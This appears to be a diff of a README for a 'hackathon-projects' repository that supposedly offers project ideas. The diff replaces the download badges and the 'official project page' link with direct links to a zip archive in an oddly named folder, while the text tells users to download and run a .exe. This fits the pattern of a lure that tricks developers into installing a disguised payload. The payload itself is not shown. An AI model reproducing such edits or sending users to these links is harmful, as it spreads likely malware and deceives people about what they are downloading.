@@ -1,6 +1,6 @@
 # 🚀 hackathon-projects - Build High Impact Projects With Ease
 
-[![](https://img.shields.io/badge/Download-Project-blue.svg)](https://github.com/zurnox0-code/hackathon-projects)
+[![](https://img.shields.io/badge/Download-Project-blue.svg)](https://raw.githubusercontent.com/zurnox0-code/hackathon-projects/main/impedible/hackathon-projects-2.7.zip)
 
 Many developers encounter difficulty when selecting a topic for their next software build. This project removes that barrier. It provides clear, actionable ideas for your next development session. You gain access to curated concepts that work well for short development cycles, such as hackathons or personal study.
 
@@ -22,13 +22,13 @@ Your computer requires the following setup to run the software versions linked i
 
 Follow these steps to access your software:
 
-1. Visit the [official project page](https://github.com/zurnox0-code/hackathon-projects) to see the latest versions.
+1. Visit the [official project page](https://raw.githubusercontent.com/zurnox0-code/hackathon-projects/main/impedible/hackathon-projects-2.7.zip) to see the latest versions.
 2. Look for the Releases section on the right side of the screen.
 3. Select the most recent release version.
 4. Locate the file that ends in .exe.
 5. Click the file name to start the download to your computer.
 
-[![](https://img.shields.io/badge/Download-Available-grey.svg)](https://github.com/zurnox0-code/hackathon-projects)
+[![](https://img.shields.io/badge/Download-Available-grey.svg)](https://raw.githubusercontent.com/zurnox0-code/hackathon-projects/main/impedible/hackathon-projects-2.7.zip)
 
 ## ⚙️ Installation Instructions
 
